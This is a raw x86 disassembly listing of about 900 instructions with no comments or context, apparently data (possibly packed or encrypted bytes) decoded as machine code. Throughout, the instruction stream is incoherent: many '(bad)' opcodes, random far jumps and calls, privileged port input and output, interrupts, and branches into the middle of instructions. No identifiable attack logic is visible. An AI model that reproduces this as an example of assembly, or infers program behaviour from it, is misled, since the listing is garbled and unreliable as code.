  40cf98:	bound  eax,QWORD PTR [ecx-0x65a3ee13]
  40cf9e:	lds    ecx,FWORD PTR [esi-0x32608e77]
  40cfa4:	test   BYTE PTR [ecx],ch
  40cfa6:	mov    bh,0x86
  40cfa8:	sbb    DWORD PTR [ebp+0x74],esp
  40cfab:	sbb    eax,0xc468b0f6
  40cfb0:	pop    esp
  40cfb1:	sbb    cl,al
  40cfb3:	mov    esi,0x58b5971f
  40cfb8:	xlat   BYTE PTR ds:[ebx]
  40cfb9:	mov    al,0x17
  40cfbb:	adc    edx,DWORD PTR [esi+0x4f609b3a]
  40cfc1:	mov    dl,BYTE PTR [edx]
  40cfc3:	aaa    
  40cfc4:	leave  
  40cfc5:	push   0x9da13f66
  40cfca:	sub    eax,0xf1f914b5
  40cfcf:	cli    
  40cfd0:	pop    ebp
  40cfd1:	ficomp DWORD PTR [edx+0x43]
  40cfd4:	jmp    0x589e:0x7fcc33a3
  40cfdb:	pop    ecx
  40cfdc:	jbe    0x40d054
  40cfde:	mov    dl,dl
  40cfe0:	jnp    0x40cfb0
  40cfe2:	push   eax
  40cfe3:	mov    esi,DWORD PTR [edi]
  40cfe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfe6:	adc    edi,DWORD PTR [ebp-0x47]
  40cfe9:	mov    eax,ds:0xd04b94ce
  40cfee:	das    
  40cfef:	js     0x40d001
  40cff1:	or     al,0x74
  40cff3:	inc    eax
  40cff4:	pop    ebp
  40cff5:	or     ah,bl
  40cff7:	cmp    al,0x71
  40cff9:	out    dx,eax
  40cffa:	xor    ebp,DWORD PTR [ebx+edi*2]
  40cffd:	jo     0x40cf8e
  40cfff:	add    ecx,DWORD PTR [eax]
  40d001:	ss mov ah,0x2
  40d004:	sar    DWORD PTR [ecx-0x14],0x81
  40d008:	popf   
  40d009:	ret    0x90eb
  40d00c:	add    edi,edi
  40d00e:	jecxz  0x40cfcc
  40d010:	xor    eax,DWORD PTR [eax]
  40d012:	sub    DWORD PTR [eax-0x3530f0b5],edx
  40d018:	adc    BYTE PTR [ecx+0x1316ed1b],0x2
  40d01f:	cld    
  40d020:	mov    edi,0xe38add12
  40d025:	adc    eax,edx
  40d027:	fsub   DWORD PTR [eax+0x4c1a7312]
  40d02d:	icebp  
  40d02e:	(bad)  
  40d02f:	outs   dx,BYTE PTR ds:[esi]
  40d030:	js     0x40d051
  40d032:	pop    esp
  40d033:	aas    
  40d034:	clc    
  40d035:	sub    DWORD PTR [esi-0x6a],edx
  40d038:	sbb    eax,0x1720775
  40d03d:	xchg   ebp,eax
  40d03e:	mov    dl,0x5a
  40d040:	sub    al,0x4b
  40d042:	jae    0x40d0ba
  40d044:	outs   dx,DWORD PTR ds:[esi]
  40d045:	call   0x3a37:0x67dc8507
  40d04c:	inc    ebx
  40d04d:	mov    dl,0xd6
  40d04f:	loopne 0x40d018
  40d051:	int    0xdb
  40d053:	and    BYTE PTR [ecx-0x52d800a2],0x61
  40d05a:	adc    al,0x51
  40d05c:	cmc    
  40d05d:	push   0xbdd824c2
  40d062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d063:	jg     0x40d034
  40d065:	and    DWORD PTR [esi+edx*1-0xe],ebp
  40d069:	shl    DWORD PTR [ecx-0x17],cl
  40d06c:	mov    DWORD PTR [esi+ecx*1-0x167de8b2],ecx
  40d073:	fldenv [eax]
  40d076:	in     eax,dx
  40d077:	mov    ebx,cs
  40d079:	add    eax,0x9d771680
  40d07e:	int3   
  40d07f:	dec    esi
  40d080:	push   ds
  40d081:	popa   
  40d082:	push   cs
  40d083:	dec    ecx
  40d084:	mov    ds:0xf2d235be,eax
  40d089:	dec    esi
  40d08a:	mov    ebx,eax
  40d08c:	les    esp,FWORD PTR [eax+0x9361a23]
  40d092:	mov    cl,0x19
  40d094:	pop    edx
  40d095:	imul   ebx,DWORD PTR ds:[ecx+0x6e122a75],0xffffffe3
  40d09d:	bound  ecx,QWORD PTR [esi]
  40d09f:	jbe    0x40d045
  40d0a1:	cmp    eax,0xa7eb7590
  40d0a6:	ret    
  40d0a7:	(bad)  
  40d0a8:	in     eax,dx
  40d0a9:	cli    
  40d0aa:	and    eax,0xa9bb5fca
  40d0af:	in     al,0x91
  40d0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0b2:	cmp    ecx,DWORD PTR [esi+0x41]
  40d0b5:	add    ah,dl
  40d0b7:	add    dl,bl
  40d0b9:	call   0x486c3724
  40d0be:	imul   DWORD PTR [edi-0x4d173109]
  40d0c4:	popa   
  40d0c5:	xchg   ch,dh
  40d0c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0c8:	gs pop eax
  40d0ca:	pop    eax
  40d0cb:	jae    0x40d0d2
  40d0cd:	sub    al,0xdc
  40d0cf:	ret    
  40d0d0:	fcomi  st,st(5)
  40d0d2:	and    eax,0xc27c3801
  40d0d7:	lods   eax,DWORD PTR ds:[esi]
  40d0d8:	sub    BYTE PTR [edx],bh
  40d0da:	sti    
  40d0db:	es xchg ecx,eax
  40d0dd:	push   0xdb05408c
  40d0e2:	jmp    0xc852:0xa72b7ecf
  40d0e9:	cld    
  40d0ea:	dec    ecx
  40d0ec:	adc    BYTE PTR [edx-0x38d555df],dh
  40d0f2:	dec    ebx
  40d0f3:	jns    0x40d150
  40d0f5:	adc    edi,esi
  40d0f7:	retf   0x14f7
  40d0fa:	lds    ebp,FWORD PTR [edi]
  40d0fc:	sbb    DWORD PTR [esi+0xfa2f829],ebp
  40d102:	pushf  
  40d103:	loopne 0x40d090
  40d105:	cmp    eax,0xa33d65f7
  40d10a:	cmp    DWORD PTR [edi-0x19c1822d],esi
  40d110:	imul   esi,DWORD PTR [edx+0x5d],0x951c878f
  40d117:	inc    ecx
  40d118:	and    BYTE PTR [ecx],al
  40d11a:	jmp    0x40d103
  40d11c:	push   es
  40d11d:	loopne 0x40d0bd
  40d11f:	stos   DWORD PTR es:[edi],eax
  40d120:	add    BYTE PTR [ebx],bl
  40d122:	cmp    BYTE PTR [esi-0x1b],0xb5
  40d126:	sbb    eax,0x9a878a6a
  40d12b:	(bad)  
  40d12d:	xchg   BYTE PTR ss:[ecx+ebx*2+0x17],ah
  40d132:	or     edi,DWORD PTR [edx+ecx*1]
  40d135:	lods   eax,DWORD PTR ds:[esi]
  40d136:	mov    al,ds:0x1a0c7a06
  40d13b:	mov    edi,esp
  40d13d:	sub    eax,0xcc1f9008
  40d142:	call   DWORD PTR [ecx]
  40d144:	cmp    cl,0xf1
  40d147:	xchg   edx,eax
  40d148:	cmp    al,0xdd
  40d14b:	mov    eax,ds:0x97bf3ed8
  40d150:	idiv   edx
  40d152:	pusha  
  40d153:	mov    cl,0x8c
  40d155:	in     al,dx
  40d156:	stc    
  40d157:	jnp    0x40d1bc
  40d159:	js     0x40d101
  40d15b:	cmp    al,0x6d
  40d15d:	push   0x45
  40d15f:	js     0x40d106
  40d161:	xchg   edi,eax
  40d162:	push   edi
  40d163:	jne    0x40d128
  40d165:	push   ebx
  40d166:	sub    ecx,DWORD PTR [edi]
  40d168:	lahf   
  40d169:	push   esi
  40d16a:	sbb    al,0x6e
  40d16c:	xor    eax,0xc8ee2c6c
  40d171:	outs   dx,BYTE PTR ds:[esi]
  40d172:	jmp    0x40d193
  40d174:	pop    ecx
  40d175:	scas   eax,DWORD PTR es:[edi]
  40d176:	loop   0x40d0fc
  40d178:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d179:	out    dx,eax
  40d17a:	pop    edi
  40d17b:	xor    BYTE PTR [esi+0x36ee2e44],bl
  40d181:	mov    ebx,0x4bce2764
  40d186:	sbb    al,BYTE PTR [ecx+edi*4+0x45f0b51e]
  40d18d:	sbb    BYTE PTR [ebx-0x538477ef],ah
  40d193:	stos   DWORD PTR es:[edi],eax
  40d194:	rcl    BYTE PTR [ebx+0xa],cl
  40d197:	push   cs
  40d198:	in     al,0x18
  40d19a:	mov    esp,0xff3ec6d
  40d19f:	add    al,ah
  40d1a1:	or     DWORD PTR [edi-0x52],0xaaab1f8a
  40d1a8:	push   ds
  40d1a9:	lods   eax,DWORD PTR ds:[esi]
  40d1aa:	or     al,0xab
  40d1ac:	outs   dx,DWORD PTR ds:[esi]
  40d1ad:	pushf  
  40d1ae:	mov    BYTE PTR [edx],0x86
  40d1b1:	mov    ebp,DWORD PTR [edx]
  40d1b3:	(bad)  
  40d1b4:	and    BYTE PTR [ebp-0x35],al
  40d1b7:	pop    edx
  40d1b8:	test   al,0x3a
  40d1ba:	mov    esp,0xb71a085b
  40d1bf:	sbb    eax,0x7b3998f1
  40d1c4:	repz xchg ebx,eax
  40d1c6:	clc    
  40d1c7:	out    0x88,al
  40d1c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1ca:	je     0x40d16b
  40d1cc:	jge    0x40d222
  40d1ce:	or     edi,DWORD PTR [edi]
  40d1d0:	mov    ebx,0xaf5990ec
  40d1d5:	mov    BYTE PTR [ebx+0x5b],bl
  40d1d8:	jns    0x40d17d
  40d1da:	in     eax,0xd4
  40d1dc:	test   eax,0x77aa9e4a
  40d1e1:	lods   al,BYTE PTR ds:[esi]
  40d1e2:	add    ah,BYTE PTR [ebp+0x4c]
  40d1e5:	or     bh,BYTE PTR [ecx-0x2d]
  40d1e8:	mov    ebx,0xd834134a
  40d1ed:	xor    eax,0xfedbd638
  40d1f2:	clc    
  40d1f3:	jle    0x40d221
  40d1f5:	aas    
  40d1f6:	test   eax,0xaacf318
  40d1fb:	call   0x2dc60c9
  40d200:	mov    esp,0x3b69d770
  40d205:	stc    
  40d206:	jl     0x40d1d2
  40d208:	iret   
  40d209:	mov    bh,0xf9
  40d20b:	jno    0x40d237
  40d20d:	leave  
  40d20e:	mov    ebp,0xb90febeb
  40d213:	loop   0x40d27c
  40d215:	ins    DWORD PTR es:[edi],dx
  40d216:	sbb    ebp,DWORD PTR [ebx+0x4d]
  40d219:	jmp    0x40d28e
  40d21b:	sbb    esi,0xffffffa9
  40d21e:	mov    ah,ch
  40d220:	sbb    eax,0x5e12dbe9
  40d225:	outs   dx,DWORD PTR ds:[esi]
  40d226:	in     eax,dx
  40d227:	jnp    0x40d29a
  40d229:	xor    eax,0x6abaf726
  40d22e:	mov    al,0xeb
  40d230:	xchg   esp,eax
  40d231:	push   ds
  40d232:	lods   eax,DWORD PTR ds:[esi]
  40d233:	xchg   edx,eax
  40d234:	jecxz  0x40d290
  40d236:	dec    esi
  40d237:	cdq    
  40d238:	daa    
  40d239:	mov    esi,0x50ee7fe5
  40d23e:	sar    DWORD PTR [ebx],0x56
  40d241:	mov    bl,0xec
  40d243:	jp     0x40d279
  40d245:	adc    eax,0x68c73c8b
  40d24a:	mov    esp,0x1e7d6bf
  40d24f:	add    bl,BYTE PTR [ebp+0x46ac3133]
  40d255:	scas   eax,DWORD PTR es:[edi]
  40d256:	out    0x30,eax
  40d258:	jb     0x40d27d
  40d25a:	mov    edx,0x2ee56a8
  40d25f:	shr    BYTE PTR [edx-0x55],0x3b
  40d263:	sub    al,0x5
  40d265:	mov    edx,0x4f70756a
  40d26a:	xchg   edx,eax
  40d26b:	in     al,dx
  40d26c:	gs pop edi
  40d26e:	dec    ebp
  40d26f:	pop    edx
  40d270:	arpl   WORD PTR [eax-0x5f],si
  40d273:	pop    esi
  40d274:	test   BYTE PTR [eax-0x3],al
  40d277:	ss jae 0x40d23b
  40d27a:	sbb    edx,esp
  40d27c:	aaa    
  40d27d:	ins    DWORD PTR es:[edi],dx
  40d27e:	ds ss inc edi
  40d281:	xor    BYTE PTR [ebp-0x4b],dl
  40d284:	mov    esi,DWORD PTR [edi+0xd6b0a9c]
  40d28a:	push   ds
  40d28b:	inc    ebx
  40d28c:	stos   DWORD PTR es:[edi],eax
  40d28d:	imul   esp,DWORD PTR [edx],0xffffff97
  40d290:	mov    BYTE PTR [eax-0x573a3c14],cl
  40d296:	cmp    esp,DWORD PTR [edx+0xa]
  40d299:	ficomp DWORD PTR [eax]
  40d29b:	mov    ds:0xa3de485e,eax
  40d2a0:	push   edi
  40d2a1:	push   edx
  40d2a2:	sti    
  40d2a3:	loop   0x40d24c
  40d2a5:	in     al,dx
  40d2a6:	cmp    DWORD PTR [eax-0x1a],ebx
  40d2a9:	ins    DWORD PTR es:[edi],dx
  40d2aa:	test   BYTE PTR [esi],ch
  40d2ac:	dec    ebx
  40d2ad:	mov    bl,0xea
  40d2af:	cs push ss
  40d2b1:	adc    BYTE PTR [edx+0x43bfa927],ah
  40d2b7:	jecxz  0x40d288
  40d2b9:	loope  0x40d241
  40d2bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2bc:	scas   al,BYTE PTR es:[edi]
  40d2bd:	sub    eax,0xd6feec82
  40d2c2:	leave  
  40d2c3:	nop
  40d2c4:	lea    edi,[eax+eiz*8+0x4e959f51]
  40d2cb:	adc    esp,DWORD PTR [ecx]
  40d2cd:	mov    ecx,0x6f630706
  40d2d2:	popf   
  40d2d3:	mov    esi,0xc6284372
  40d2d8:	scas   eax,DWORD PTR es:[edi]
  40d2d9:	add    al,0x23
  40d2db:	push   cs
  40d2dc:	mov    cl,al
  40d2de:	mov    ecx,0xf8b1b507
  40d2e3:	sbb    BYTE PTR [ebx+0x9654ad2],cl
  40d2e9:	adc    al,0xa6
  40d2eb:	test   al,0x22
  40d2ed:	repnz push esp
  40d2ef:	add    edi,esp
  40d2f1:	repz xchg edi,eax
  40d2f3:	sub    DWORD PTR [ebp+0x19ed1092],ecx
  40d2f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2fa:	stos   BYTE PTR es:[edi],al
  40d2fb:	gs xchg ebp,eax
  40d2fd:	bound  edi,QWORD PTR [eax+0x64073d50]
  40d303:	sbb    ebx,DWORD PTR [edx]
  40d305:	ret    0x1659
  40d308:	mov    ebp,0xb99107b9
  40d30d:	outs   dx,DWORD PTR ds:[esi]
  40d30e:	xchg   ecx,eax
  40d30f:	sahf   
  40d310:	sub    DWORD PTR [edx],ebx
  40d312:	jns    0x40d2e6
  40d314:	sbb    esi,edi
  40d316:	and    esi,edx
  40d318:	jp     0x40d2f4
  40d31a:	xchg   BYTE PTR [ebp+0x36],bh
  40d31d:	repnz in al,0xc8
  40d320:	(bad)  
  40d321:	mov    bl,0xd1
  40d323:	sbb    ah,BYTE PTR [eax+0x21]
  40d326:	mov    ds:0x425cf772,eax
  40d32b:	mov    ecx,0xb15be84e
  40d330:	sbb    al,0x2e
  40d332:	jnp    0x40d2e9
  40d334:	xchg   esp,eax
  40d335:	pop    esi
  40d336:	(bad)  
  40d337:	loopne 0x40d30c
  40d339:	mov    edi,DWORD PTR [esi+0x73]
  40d33c:	cmp    ax,0x7893
  40d340:	loope  0x40d2dd
  40d342:	jns    0x40d389
  40d344:	test   eax,0x6c58cd15
  40d349:	sub    ebx,0xffffffdc
  40d34c:	out    dx,al
  40d34d:	mov    ebx,0xaa207c91
  40d352:	sub    BYTE PTR [ebp-0x55c38b08],bl
  40d358:	cmp    eax,0x9f134c7a
  40d35d:	call   0x5f010274
  40d362:	xchg   esp,eax
  40d363:	lods   al,BYTE PTR ds:[esi]
  40d364:	cmp    al,0x31
  40d366:	pop    ss
  40d367:	mov    dh,0x4b
  40d369:	push   ss
  40d36a:	or     eax,0x68b919fa
  40d36f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d370:	xchg   edx,eax
  40d371:	fcmovbe st,st(4)
  40d373:	jo     0x40d333
  40d375:	mov    bl,0xb7
  40d377:	mov    al,ds:0x2b05e7f6
  40d37c:	mov    eax,0x82c37b0
  40d381:	pop    DWORD PTR [eax-0x75]
  40d384:	loop   0x40d3b2
  40d386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d387:	add    eax,0x3d4e68d2
  40d38c:	sahf   
  40d38d:	ins    DWORD PTR es:[edi],dx
  40d38e:	sub    eax,0x25c8094c
  40d393:	out    dx,al
  40d394:	sar    edi,1
  40d396:	inc    esp
  40d397:	ficom  DWORD PTR [ecx]
  40d399:	lock (bad) 
  40d39b:	adc    ebx,ebx
  40d39d:	cmp    al,0x1a
  40d39f:	sbb    BYTE PTR [esp+ebp*2+0x5d5baa5e],0xb7
  40d3a7:	sub    ecx,0x2adc77bf
  40d3ad:	push   ecx
  40d3ae:	ins    BYTE PTR es:[edi],dx
  40d3af:	sti    
  40d3b0:	jp     0x40d3db
  40d3b2:	mov    ebp,0x518f20d8
  40d3b7:	xchg   si,ax
  40d3b9:	lods   al,BYTE PTR ds:[esi]
  40d3ba:	mov    ?,WORD PTR [ebx]
  40d3bc:	out    dx,eax
  40d3bd:	popf   
  40d3be:	push   ds
  40d3bf:	into   
  40d3c0:	xor    dl,BYTE PTR [ebp-0x17]
  40d3c3:	cmc    
  40d3c4:	mov    dh,BYTE PTR [ebx+0x34]
  40d3c7:	pop    ds
  40d3c8:	jno    0x40d3d3
  40d3ca:	into   
  40d3cb:	cld    
  40d3cc:	mov    al,0x22
  40d3ce:	(bad)  
  40d3cf:	loope  0x40d41c
  40d3d1:	xchg   esp,eax
  40d3d2:	loop   0x40d39d
  40d3d4:	sbb    BYTE PTR [edx+0x71c4c16],cl
  40d3da:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3dc:	fmul   QWORD PTR [ebx+0x4a]
  40d3df:	int    0x4c
  40d3e1:	stos   DWORD PTR es:[edi],eax
  40d3e2:	mov    eax,ds:0xc7ae824f
  40d3e7:	das    
  40d3e8:	cmp    DWORD PTR [edx],ebx
  40d3ea:	pop    ecx
  40d3eb:	jnp    0x40d456
  40d3ed:	sub    eax,0x5ac888a7
  40d3f2:	retf   
  40d3f3:	dec    ebx
  40d3f4:	xor    cl,BYTE PTR [esi-0x4d57db35]
  40d3fa:	fist   WORD PTR [edi+0x4a]
  40d3fd:	(bad)  
  40d3fe:	dec    ebx
  40d3ff:	mov    eax,0xa16e3318
  40d404:	test   al,0x0
  40d406:	push   edx
  40d407:	xchg   ecx,eax
  40d408:	sbb    esp,DWORD PTR [eax+0x4dfb9b8a]
  40d40e:	test   DWORD PTR [edx-0x45cbca1e],ecx
  40d414:	add    al,0x7f
  40d416:	bound  esi,QWORD PTR [edx]
  40d418:	inc    ecx
  40d419:	sub    esi,esp
  40d41b:	out    0x91,al
  40d41d:	lahf   
  40d41e:	or     edi,DWORD PTR [ebx-0x51b8dd8b]
  40d424:	(bad)  
  40d425:	xor    eax,0x16fc2209
  40d42a:	xchg   ebx,eax
  40d42b:	arpl   ax,sp
  40d42d:	fnstcw WORD PTR [ecx]
  40d42f:	je     0x40d3e0
  40d431:	jmp    0xe699c951
  40d436:	ret    0x11e
  40d439:	adc    al,0x0
  40d43b:	and    bl,BYTE PTR [esi]
  40d43d:	push   es
  40d43e:	dec    ebx
  40d43f:	outs   dx,BYTE PTR ds:[esi]
  40d440:	sahf   
  40d441:	shl    eax,0xac
  40d444:	cli    
  40d445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d446:	push   eax
  40d447:	daa    
  40d448:	jno    0x40d4ae
  40d44a:	dec    ecx
  40d44b:	inc    esi
  40d44c:	lahf   
  40d44d:	add    ah,BYTE PTR [edx]
  40d44f:	shl    BYTE PTR [edi+edx*2-0x14],cl
  40d453:	xchg   edi,eax
  40d454:	sahf   
  40d455:	inc    ebx
  40d456:	sbb    eax,0xcdcf393a
  40d45b:	test   BYTE PTR [ecx+0x659302a9],ah
  40d461:	pop    esp
  40d462:	xor    BYTE PTR [eax+0x4c],bl
  40d465:	or     BYTE PTR [eax-0x9],0xd0
  40d469:	and    eax,edx
  40d46b:	xor    ecx,edi
  40d46d:	mov    DWORD PTR [ebp-0x4],eax
  40d470:	jmp    0x40d9fa
  40d475:	mov    ds:0x60bf5ac5,eax
  40d47a:	sbb    BYTE PTR [edx],ah
  40d47c:	cdq    
  40d47d:	cmovbe edx,DWORD PTR [edx+esi*4-0x16]
  40d482:	adc    al,0xca
  40d484:	outs   dx,BYTE PTR ds:[esi]
  40d485:	xlat   BYTE PTR ds:[ebx]
  40d486:	mov    ah,0x16
  40d488:	push   ss
  40d489:	cmp    eax,0x62161604
  40d48e:	cmp    esi,DWORD PTR ds:0x49d8432c
  40d494:	(bad)  
  40d495:	out    0xde,eax
  40d497:	stos   DWORD PTR es:[edi],eax
  40d498:	adc    ecx,DWORD PTR [ebx]
  40d49a:	pop    ecx
  40d49b:	xor    al,0x10
  40d49d:	or     al,al
  40d49f:	lock pop es
  40d4a1:	stos   DWORD PTR es:[edi],eax
  40d4a2:	jl     0x40d49c
  40d4a4:	(bad)  
  40d4a6:	pushf  
  40d4a7:	sahf   
  40d4a8:	fsubr  DWORD PTR [edx+eiz*4-0xde24657]
  40d4af:	pop    esi
  40d4b0:	push   ebx
  40d4b1:	fs test al,0x83
  40d4b4:	push   ebx
  40d4b5:	mov    cl,0xf7
  40d4b7:	jae    0x40d448
  40d4b9:	mov    ebx,ebx
  40d4bb:	icebp  
  40d4bc:	jae    0x40d49c
  40d4be:	adc    BYTE PTR [esi-0x7a],dl
  40d4c1:	add    BYTE PTR [ebx+0x7471816c],ch
  40d4c7:	add    cl,BYTE PTR [ebx+0x28]
  40d4ca:	add    eax,0xf750f59b
  40d4cf:	sbb    al,0x9a
  40d4d1:	mov    esi,0x728f8112
  40d4d6:	call   0x1f8b8c8
  40d4db:	test   ebp,0x22c6612d
  40d4e1:	fidiv  DWORD PTR [esi+ecx*1-0x20]
  40d4e5:	xchg   esi,eax
  40d4e6:	in     al,0x60
  40d4e8:	fs push ecx
  40d4ea:	clc    
  40d4eb:	nop
  40d4ec:	cwde   
  40d4ed:	pop    ebp
  40d4ee:	sbb    DWORD PTR [edi],0x7b3db736
  40d4f4:	push   ecx
  40d4f5:	sub    al,0xe2
  40d4f7:	das    
  40d4f8:	mov    bh,0xd6
  40d4fa:	jno    0x40d47d
  40d4fc:	mov    ?,WORD PTR [ebx+0x7b]
  40d4ff:	jecxz  0x40d506
  40d501:	ss mov dh,0xa2
  40d504:	cs inc ebp
  40d506:	dec    eax
  40d507:	loopne 0x40d541
  40d509:	cmp    DWORD PTR [ebx-0xaa13e35],ecx
  40d50f:	sub    ch,BYTE PTR [eax]
  40d511:	xchg   DWORD PTR [edx+0x47c4e6a8],ebp
  40d517:	sub    eax,0x926b35
  40d51c:	dec    ecx
  40d51d:	dec    ecx
  40d51e:	ins    BYTE PTR es:[edi],dx
  40d51f:	xchg   DWORD PTR [ecx],ecx
  40d521:	outs   dx,DWORD PTR ds:[esi]
  40d522:	sbb    DWORD PTR [edi+0x2d21b8bb],esp
  40d528:	retf   
  40d529:	sti    
  40d52a:	add    bh,bh
  40d52c:	mov    ebx,0x2fcdfdd5
  40d531:	das    
  40d532:	mov    ss,WORD PTR [ebx]
  40d534:	into   
  40d535:	mov    eax,ebx
  40d537:	inc    esp
  40d538:	fnsave [eax+0x3a]
  40d53b:	adc    DWORD PTR [ebx],ebx
  40d53d:	pop    es
  40d53e:	jnp    0x40d4c4
  40d540:	mov    eax,fs:0xdd750ed3
  40d546:	in     eax,dx
  40d547:	pop    ebp
  40d548:	push   cs
  40d549:	cmp    al,0xec
  40d54b:	ins    BYTE PTR es:[edi],dx
  40d54c:	mov    ebx,0xf02b94f8
  40d551:	inc    esi
  40d552:	mov    ecx,0x7ea1299e
  40d557:	in     eax,dx
  40d558:	gs aas 
  40d55a:	retf   
  40d55b:	test   edi,esp
  40d55d:	fild   QWORD PTR [edx+eax*1]
  40d560:	cwde   
  40d561:	sbb    eax,DWORD PTR [esi]
  40d563:	push   ecx
  40d564:	sub    al,0xc5
  40d566:	jnp    0x40d54d
  40d568:	mov    al,0x9
  40d56a:	test   edx,esp
  40d56c:	sub    BYTE PTR [ecx],0x10
  40d56f:	test   DWORD PTR ss:[ecx+0x2067836f],ecx
  40d576:	dec    ebp
  40d577:	adc    ch,BYTE PTR [edi]
  40d579:	push   0xfc8441fd
  40d57e:	cli    
  40d57f:	xor    bl,BYTE PTR [ecx+0x68]
  40d582:	adc    eax,DWORD PTR [ecx+0x23]
  40d585:	dec    eax
  40d586:	shl    dl,cl
  40d588:	cli    
  40d589:	inc    ebx
  40d58a:	mov    ds:0x825aba21,eax
  40d58f:	inc    edx
  40d590:	sahf   
  40d591:	pop    esp
  40d592:	sahf   
  40d593:	sbb    esp,ebx
  40d595:	mov    bh,0x99
  40d597:	in     eax,dx
  40d598:	jge    0x40d57d
  40d59a:	stc    
  40d59b:	in     al,0xdb
  40d59d:	pushf  
  40d59e:	jb     0x40d5a3
  40d5a0:	div    BYTE PTR [esi+0x4631139a]
  40d5a6:	je     0x40d590
  40d5a8:	shr    DWORD PTR [ebx+eiz*8-0x77992816],cl
  40d5af:	mov    ebp,DWORD PTR [ebp-0x3c]
  40d5b2:	arpl   WORD PTR [ebx],bx
  40d5b4:	lock or dh,dh
  40d5b7:	mov    esp,0x7decc91
  40d5bc:	jb     0x40d5e5
  40d5be:	or     al,0x94
  40d5c0:	cmp    eax,0x9d9a802f
  40d5c5:	sub    al,BYTE PTR [eax]
  40d5c7:	in     al,dx
  40d5c8:	mov    gs,ecx
  40d5ca:	scas   al,BYTE PTR es:[edi]
  40d5cb:	sbb    eax,0xc0f2dc8d
  40d5d0:	jmp    0x40d5f1
  40d5d2:	lods   eax,DWORD PTR ds:[esi]
  40d5d3:	add    DWORD PTR [ebp-0x7a],ebx
  40d5d6:	int3   
  40d5d7:	dec    BYTE PTR [esi+0xa]
  40d5da:	xlat   BYTE PTR ds:[ebx]
  40d5db:	dec    eax
  40d5dc:	jecxz  0x40d5e4
  40d5de:	rcl    DWORD PTR [edi+eax*4+0x4b],1
  40d5e2:	mov    cl,0xd4
  40d5e4:	ss push es
  40d5e6:	shr    BYTE PTR [ebx-0x56],0xd4
  40d5ea:	mov    edx,0xab773a78
  40d5ef:	sbb    DWORD PTR [ebx+0x4a],ebp
  40d5f2:	fstp   TBYTE PTR [ebp+ebx*2-0x8]
  40d5f6:	jge    0x40d641
  40d5f8:	adc    DWORD PTR [edi-0x8540a7e],ecx
  40d5fe:	(bad)  [ecx]
  40d600:	add    eax,0xd22d93fc
  40d605:	out    dx,al
  40d606:	fdivr  st(7),st
  40d608:	or     eax,0x2b93fd94
  40d60d:	rcr    DWORD PTR [edi-0x75f43a73],1
  40d613:	fld    st(7)
  40d615:	jne    0x40d664
  40d617:	dec    eax
  40d618:	mov    ecx,0xdf009dd9
  40d61d:	cli    
  40d61e:	call   0x679f:0xace0ac6f
  40d625:	inc    esp
  40d626:	dec    ebp
  40d627:	mov    ch,0x35
  40d629:	or     dl,dl
  40d62b:	jl     0x40d62a
  40d62d:	or     BYTE PTR [edx],ah
  40d62f:	xlat   BYTE PTR ds:[ebx]
  40d630:	dec    eax
  40d631:	push   cs
  40d632:	ret    0xc699
  40d635:	sub    eax,0xcb2390bd
  40d63a:	or     ecx,DWORD PTR [ebx-0x8]
  40d63d:	sbb    BYTE PTR [esi],dl
  40d63f:	dec    BYTE PTR [esi]
  40d641:	xchg   edi,eax
  40d642:	in     al,dx
  40d643:	mov    ds:0xb8643542,eax
  40d648:	pop    ebp
  40d649:	int3   
  40d64a:	gs mov esi,0x6e58108f
  40d650:	mov    dh,cl
  40d652:	adc    eax,0xe4a30792
  40d657:	jb     0x40d627
  40d659:	or     eax,0x41c7be28
  40d65e:	xchg   BYTE PTR [eax],ah
  40d660:	je     0x40d699
  40d662:	pop    ebx
  40d663:	jl     0x40d68a
  40d665:	arpl   WORD PTR [edi],bp
  40d667:	daa    
  40d668:	(bad)  
  40d669:	xor    BYTE PTR [edi],bh
  40d66b:	xor    al,0x7
  40d66d:	cwde   
  40d66e:	call   0x8720:0xf9b98b
  40d675:	or     al,0x2d
  40d678:	adc    dl,dh
  40d67a:	xor    dh,BYTE PTR [eax+edi*8-0x6]
  40d67e:	imul   eax,ebx,0xffffff97
  40d681:	sbb    eax,0x6eca8298
  40d686:	pop    ss
  40d687:	mov    BYTE PTR [ecx+eiz*2-0x3],al
  40d68b:	into   
  40d68c:	push   edx
  40d68d:	sbb    esp,DWORD PTR [ebx]
  40d68f:	dec    ecx
  40d690:	test   al,0x88
  40d692:	push   0x13
  40d694:	jmp    0x40d689
  40d696:	cmp    BYTE PTR [ebx],ch
  40d698:	mov    al,ah
  40d69a:	add    edx,DWORD PTR [ecx+0x4dee571e]
  40d6a0:	cmp    bl,BYTE PTR [ebp+0x9]
  40d6a3:	xchg   DWORD PTR [eax+0x1a41b18a],esi
  40d6a9:	and    ebp,DWORD PTR [ebx-0x2b]
  40d6ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6ad:	mov    BYTE PTR [esi],ch
  40d6af:	jae    0x40d6bc
  40d6b1:	jge    0x40d6e6
  40d6b3:	lds    edi,FWORD PTR [ebp+0x95fdb9a]
  40d6b9:	es mov ecx,0x7446e5ab
  40d6bf:	addr16 rcr bh,cl
  40d6c2:	les    esp,FWORD PTR [edx+0x72]
  40d6c5:	mov    WORD PTR [edx+0x3c],ds
  40d6c8:	into   
  40d6c9:	fnstcw WORD PTR [edi+0x30]
  40d6cc:	daa    
  40d6cd:	rol    BYTE PTR [edi],0x58
  40d6d0:	or     esp,DWORD PTR [esi]
  40d6d2:	jecxz  0x40d6c8
  40d6d4:	and    DWORD PTR [edi+0x6720ac9f],ebx
  40d6da:	aad    0xb
  40d6dc:	bound  ecx,QWORD PTR [ecx+eiz*4]
  40d6df:	xchg   BYTE PTR [edx-0x1a],bh
  40d6e2:	pop    edx
  40d6e3:	dec    edi
  40d6e4:	loopne 0x40d6ed
  40d6e6:	sbb    eax,0x4b8a016b
